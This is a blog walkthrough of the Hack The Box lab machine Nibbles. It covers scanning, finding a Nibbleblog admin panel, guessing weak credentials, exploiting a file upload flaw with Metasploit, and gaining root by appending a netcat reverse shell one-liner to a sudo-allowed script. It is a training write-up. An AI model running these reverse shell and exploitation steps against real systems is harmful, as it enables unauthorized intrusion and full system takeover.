---
title: 'HTB Walkthrough: Nibbles'
date: 2022/2/13
description: 'Something I really enjoy recently is trying to break into machines on Hack The Box: They are an "online cybersecurity training platform", and, among other things, offer many different machines to level up your pentesting skills.'
tag: htb walkthrough
---

# HTB Walkthrough: Nibbles

Something I really enjoy recently is trying to break into machines on [Hack The Box](https://hackthebox.com): They are an "online cybersecurity training platform", and, among other things, offer many different machines to level up your pentesting skills.

[Nibbles](https://app.hackthebox.com/machines/Nibbles) is very much a beginner box, created by [mrb3n](https://app.hackthebox.com/users/2984). Based on Linux, it features a vulnerable web application and a misconfiguration of file permissions.

## Service Scanning

Let's start by performing a basic `nmap` scan on the box:

```text
└─$ nmap -sV 10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 20:02 GMT
Nmap scan report for 10.10.10.75
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From this quick nmap scan we can see that there are two open ports, port `22` for `ssh` and port `80` for `http`. It's important to note though that [nmap by default only scans the most common 1,000 ports](<https://nmap.org/book/man-port-specification.html#:~:text=By%20default%2C%20Nmap%20scans%20the,1%2C000%20ports%20for%20each%20protocol.&text=This%20option%20specifies%20which%20ports,(e.g.%201%2D1023%20).>) - so it's always good to check if there are any other open ports. We will run a full scan with the `-p-` flag. This doesn't return any new information, however.

Next we'll try to do some banner grabbing with netcat to see if we can get any additional information from these two ports:

```text
└─$ nc -nv 10.10.10.75 22
(UNKNOWN) [10.10.10.75] 22 (ssh) open
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2

└─$ nc -nv 10.10.10.75 80
(UNKNOWN) [10.10.10.75] 80 (http) open
```

This only confirms the information that we already had from `nmap` anyways.

Next, we will run `nmap` again, but with the slightly more intrusive `-sV` flag, to see if that can discover anything we haven't found yet. We'll also run [nmap's `http-enum` script](https://nmap.org/nsedoc/scripts/http-enum.html), which will check the webserver on port `80` for a list of directories commonly used by web applications and frameworks. Neither of the two return anything interesting though.

```text
└─$ nmap -sC -p 22,80 10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 20:16 GMT
Nmap scan report for 10.10.10.75
Host is up (0.19s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds


└─$ nmap -sV --script=http-enum  10.10.10.75
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-21 20:20 GMT
Nmap scan report for 10.10.10.75
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

We'll now try to enumerate the webserver on port `80` to see if we can find any interesting information.

Using [whatweb](https://github.com/urbanadventurer/WhatWeb) we try to identify the web application in use:

```text
└─$ whatweb 10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

For this box, however, `whatweb` doesn't reveal any new information, so let's just open the webserver in a browser and see what we can find.

![Screenshot of the nibbles webserver](/images/htb-nibbles-1.png)

We're presented with an innocent looking "Hello World" page, but upon closer inspection of the source (Right click -> Inspect) we can see an interesting comment:

```html
<!--  /nibbleblog/ directory. Nothing interesting here!  -->
```

There seems to possibly be some additional content under the `/nibbleblog` directory, so let's navigate there instead.

![Screenshot of the nibbles webserver under the /nibbleblog path](/images/htb-nibbles-2.png)

We can see that indeed there seems to be some kind of CMS running under the `/nibbleblog` prefix. Running `whatweb` again we now are getting some better information on the tech stack of the webserver.

```text
http://10.10.10.75/nibbleblog
  [301 Moved Permanently] Apache[2.4.18],
  Country[RESERVED][ZZ],
  HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
  IP[10.10.10.75],
  RedirectLocation[http://10.10.10.75/nibbleblog/],
  Title[301 Moved Permanently]
http://10.10.10.75/nibbleblog/
  [200 OK] Apache[2.4.18],
  Cookies[PHPSESSID],
  Country[RESERVED][ZZ],
  HTML5,
  HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)],
  IP[10.10.10.75],
  JQuery,
  MetaGenerator[Nibbleblog],
  PoweredBy[Nibbleblog],
  Script,
  Title[Nibbles - Yum yum]
```

There seems to be some kind of CMS called [Nibbleblog](https://www.nibbleblog.com/), likely based on PHP (due to the `PHPSESSID` cookie). Also, the frontend seems to be using [JQuery](https://jquery.com/).

Let's see if we can find some additional information by trying to brute-force further pages using [gobuster](https://github.com/OJ/gobuster):

Gobuster reveals a few more interesting pages:

- `/nibbleblog/admin.php`, which seems to be the admin panel for the CMS
- `/nibbleblog/README`, telling us that `v4.0.3` of Nibbleblog is being used, which was released back in 2014
- `/nibbleblog/content`, which has directory listing enabled. After browsing for a bit this leads us to:
  - `nibbleblog/content/private/users.xml`, which contains a list of users, including a user called `admin`. It does not contain passwords, unfortunately.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<users>
	<user username="admin">
		<id type="integer">0</id>
		<session_fail_count type="integer">0</session_fail_count>
		<session_date type="integer">1647895480</session_date>
	</user>
	<blacklist type="string" ip="10.10.10.1">
		<date type="integer">1512964659</date>
		<fail_count type="integer">1</fail_count>
	</blacklist>
	<blacklist type="string" ip="10.10.14.12">
		<date type="integer">1647894697</date>
		<fail_count type="integer">4</fail_count>
	</blacklist>
</users>
```

We can use this username `admin` together with a few common passwords to try to login to the admin panel at `/admin`. And indeed, after trying a few different passwords, like `admin`, `root`, `123456` - the page title `nibbles` seems to do the trick.

## Recap

Let's recap what we have found so far:

- The box has two open ports: `22/ssh` and `80/http`
- It's running Nibbleblog `v4.0.3` which seems to be PHP-based
- There is an admin portal at `/nibbleblog/admin.php`
- We can login to the admin portal using `admin/nibbles`

This is a good starting point and we can now move on to try to exploit the machine.

## Gaining Access

To get started, we'll spin up metasploit (`msfconsole`) and search for any existing exploits that might be available for nibbleblog:

```text
msf6 > search nibbleblog

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nibbleblog_file_upload
```

It looks like there is an exploit available that targets Nibbleblog version `4.0.3` - the one we are using. That's great news!

After setting the required options and selecting a simple payload (`generic/shell_reverse_tcp`) we can check one last time if the box seems to be vulnerable:

```text
msf6 exploit(multi/http/nibbleblog_file_upload) > check
[*] 10.10.10.75:80 - The target appears to be vulnerable.
```

Great! Let's run the exploit.

```text
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit

[*] Started reverse TCP handler on 10.10.16.5:4444
[+] Deleted image.php
[*] Command shell session 1 opened (10.10.16.5:4444 -> 10.10.10.75:45732 ) at 2022-03-21 21:04:06 +0000

id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)

```

And we're in!

## Exploring the Filesystem

Now that we're inside the box, let's take a closer look at the filesystem.
There seems to be a zip archive in the home folder of the user. After unzipping, the home folder looks like this:

```text
nibbler@Nibbles:/home/nibbler$ tree
tree
.
|-- personal
|   `-- stuff
|       `-- monitor.sh
|-- personal.zip
`-- user.txt
```

> `user.txt` includes the first flag! Yay!
> Now on to the root flag.

There is a shell scipt hidden inside the Zip file.
It doesn't seem to do anything interesting though.
Maybe we can run it as `sudo` though?

```text
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Jackpot!

> Note: We could explore a lot more here, e.g. using [LinEnum](https://github.com/rebootuser/LinEnum) to enumerate the box - we have all we need though, so let's skip that here

## Privilege Escalation

We're able to run `monitor.sh` as a root user, and we can also write to the file.
It would be perfect for us if we can spawn a shell using the file, because that would have elevated privileges.

We will do that by creating a reverse shell using the file:

```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <OUR IP> 8443 >/tmp/f' | tee -a monitor.sh
```

This command simply appends our reverse shell initiation to the end of the `monitor.sh` file.
We now need to also run a listener on our local machine, so that we can catch the connection request.
Netcat is a good choice here:

```bash
nc -lvnp 8443
```

Now, let's run the `sudo ./monitor.sh` and see what happens:

```bash
└─$ nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.10.75] 40502
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

We're in!
The root flag is in `/root/root.txt`.
